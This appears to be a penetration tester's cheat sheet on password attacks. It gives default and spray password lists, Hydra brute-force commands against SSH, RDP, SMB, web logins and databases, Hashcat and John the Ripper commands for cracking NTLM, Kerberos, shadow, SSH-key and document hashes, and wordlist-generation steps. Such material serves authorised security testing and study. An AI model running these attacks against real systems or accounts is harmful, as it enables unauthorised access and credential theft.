---
tags:
  - Credential_Access
  - Foundational
  - Password_Attack
---

## Password Attack Strategy
resources: [HackTricks - Brute Force](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/brute-force.html)

> [!tip] **Attack order:** Try username as password, service name as creds (e.g., `tomcat:tomcat`), common defaults, then wordlists.

### Common Default Passwords
> Try these first before running large wordlists.

```text
password
password1
Password1
Password@123
admin
admin123
administrator
Welcome1
123456
12345678
```

### Common Spray Passwords
> [!info] Seasonal and company-based patterns:
> - **Season+Year:** Summer2024!, Winter2024!, Spring2024!, Fall2024!
> - **Month+Year:** January2024!, December2024!
> - **Company+123:** CompanyName123!, CompanyName1!
> - **Password variants:** Password1!, P@ssw0rd!, Qwerty123!
> - **Default/Lazy:** Welcome1!, Changeme1!

## Online Attacks (Hydra)

> Dictionary attacks against network services. Faster than brute-force but limited to wordlist contents.

### SSH Brute Force
```bash
hydra -l <Username> -P /usr/share/wordlists/rockyou.txt ssh://<Target>
```

#### SSH with Username List
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<Target>
```

### RDP Brute Force
```bash
hydra -l <Username> -P /usr/share/wordlists/rockyou.txt rdp://<Target>
```

### FTP Brute Force
```bash
hydra -l <Username> -P /usr/share/wordlists/rockyou.txt ftp://<Target>
```

### SMB Brute Force
```bash
hydra -l <Username> -P /usr/share/wordlists/rockyou.txt smb://<Target>
```

### HTTP POST Form
> [!tip] Capture login request in **Burp** to identify parameters and failure message.

```bash
hydra -l <Username> -P /usr/share/wordlists/rockyou.txt <Target> http-post-form "/<LoginPath>:<UserParam>=^USER^&<PassParam>=^PASS^:<FailureString>"
```

### HTTP Basic Auth
```bash
hydra -l <Username> -P /usr/share/wordlists/rockyou.txt <Target> http-get /<Path>
```

### MySQL
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt <Target> mysql
```

### MSSQL
```bash
hydra -l sa -P /usr/share/wordlists/rockyou.txt <Target> mssql
```

### VNC
```bash
hydra -P /usr/share/wordlists/rockyou.txt vnc://<Target>
```

### SMTP
```bash
hydra -l <Username> -P passwords.txt <Target> smtp -V
```

## Hash Identification

### Identify Hash Type
```bash
hashid '<Hash>'
hashid -m '<Hash>'
hash-identifier
```

> Online: https://hashes.com/en/tools/hash_identifier

### Hashcat Modes Reference
> [!info] Common hash modes:
> - **0** - MD5
> - **100** - SHA1
> - **1000** - NTLM
> - **1400** - SHA256
> - **1700** - SHA512
> - **1800** - sha512crypt ($6$)
> - **3200** - bcrypt
> - **5600** - NetNTLMv2
> - **13100** - Kerberoast (TGS)
> - **18200** - AS-REP Roast
> - **13400** - KeePass

### Lookup Hashcat Mode
```bash
hashcat --help | grep -i "md5"
hashcat --example-hashes | grep -FB2 '$1$'
```

## Offline Cracking - Hashcat

> GPU-accelerated hash cracking. Faster than CPU-based tools.

### Basic Attack
```bash
hashcat -m <Mode> <HashFile> /usr/share/wordlists/rockyou.txt
```

### With Rules
```bash
hashcat -m <Mode> <HashFile> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### Show Cracked Passwords
```bash
hashcat -m <Mode> <HashFile> --show
```

### Resume Session
```bash
hashcat --restore
```

### Mask Attack (Brute Force)
```bash
hashcat -m <Mode> <HashFile> -a 3 ?a?a?a?a?a?a
```

> **Charsets:** `?l` lowercase, `?u` uppercase, `?d` digits, `?s` special, `?a` all

### Hybrid Attack (Word + Digits)
```bash
hashcat -m <Mode> <HashFile> -a 6 /usr/share/wordlists/rockyou.txt ?d?d?d?d
```

### Useful Rule Files
> [!info] Common rule files:
> - `/usr/share/hashcat/rules/best64.rule` - Fast, good coverage
> - `/usr/share/hashcat/rules/rockyou-30000.rule` - Common patterns
> - `/usr/share/hashcat/rules/d3ad0ne.rule` - Comprehensive
> - `/usr/share/hashcat/rules/dive.rule` - Large, exhaustive

## Hashcat - Specific Hash Types

### NTLM
```bash
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt
```

### NetNTLMv2
```bash
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt
```

### Kerberoast (TGS-REP)
```bash
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
```

### AS-REP Roast
```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### SHA512crypt ($6$)
```bash
hashcat -m 1800 shadow.txt /usr/share/wordlists/rockyou.txt
```

### MD5crypt ($1$)
```bash
hashcat -m 500 md5crypt.hash /usr/share/wordlists/rockyou.txt
```

### KeePass Database
```bash
keepass2john <Database>.kdbx > keepass.hash
sed -i 's/^Database://' keepass.hash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
```

### SSH Private Key
```bash
ssh2john <PrivateKey> > ssh.hash
hashcat -m 22921 ssh.hash /usr/share/wordlists/rockyou.txt
```

> **SSH modes:** -m 22911 (RSA/DSA), -m 22921 (ECDSA), -m 22931 (ED25519)

### Office Documents
```bash
python office2john.py <Input_File> > extractedHash.txt
hashcat -a 0 -m <Mode> --username -o cracked.txt extractedHash.txt /usr/share/wordlists/rockyou.txt
```

> **Office modes:** 9400 (2007), 9500 (2010), 9600 (2013), 25300 (2016 SheetProtection)

## John the Ripper

### Basic Attack
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt <HashFile>
```

### Show Cracked
```bash
john --show <HashFile>
```

### Specific Format
```bash
john <HashFile> --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt
```

### Crack /etc/shadow
```bash
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

### SSH Key
```bash
ssh2john id_rsa > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
```

### ZIP File
```bash
zip2john archive.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

### RAR File
```bash
rar2john archive.rar > rar.hash
john --wordlist=/usr/share/wordlists/rockyou.txt rar.hash
```

### PDF
```bash
pdf2john document.pdf > pdf.hash
john --wordlist=/usr/share/wordlists/rockyou.txt pdf.hash
```

## Wordlist Generation

### CeWL - Generate from Website
```bash
cewl http://<Target> -d 3 -m 6 -w wordlist.txt
cewl http://<Target> -d 3 -m 6 --email -w wordlist.txt
```

### Crunch - Generate Pattern Wordlist
```bash
crunch 8 8 -t Pass@@%% -o wordlist.txt
```

> `@` lowercase, `,` uppercase, `%` number, `^` special

### Hashcat - Generate Wordlist from Mask
```bash
hashcat --stdout -a 3 --increment --increment-min 2 "Summer?d?d?d?d" > wordlist.txt
```

### Mutate Wordlist with Rules
```bash
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule wordlist.txt > mutated.txt
```

## Wordlists

### Common Locations
> [!info] Built-in wordlists on Kali:
> - **/usr/share/wordlists/rockyou.txt** - 14 million passwords from breach
> - **/usr/share/wordlists/seclists/** - SecLists collection
